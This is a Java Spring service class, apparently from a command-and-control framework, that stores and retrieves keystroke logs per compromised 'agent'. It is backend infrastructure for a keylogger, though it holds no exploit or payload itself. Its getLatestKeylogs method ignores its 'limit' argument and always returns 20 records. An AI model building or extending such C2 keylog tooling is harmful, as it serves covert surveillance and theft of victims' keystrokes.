package com.javac2.framework.JavaC2Framework.Service;

import com.javac2.framework.JavaC2Framework.Model.Keylog;
import com.javac2.framework.JavaC2Framework.Repository.KeylogRepo;
import org.springframework.beans.factory.annotation.Autowired;
import org.springframework.stereotype.Service;

import java.util.List;

@Service
public class KeylogService {
    @Autowired
    private KeylogRepo keylogRepo;

    public Keylog saveKeylog(Keylog keylog) {
        return keylogRepo.save(keylog);
    }

    public List<Keylog> getKeylogsByAgent(String agentId) {
        return keylogRepo.findByAgentIdOrderByTimestampDesc(agentId);
    }

    public List<Keylog> getLatestKeylogs(String agentId, int limit) {
        return keylogRepo.findTop20ByAgentIdOrderByTimestampDesc(agentId);
    }
} 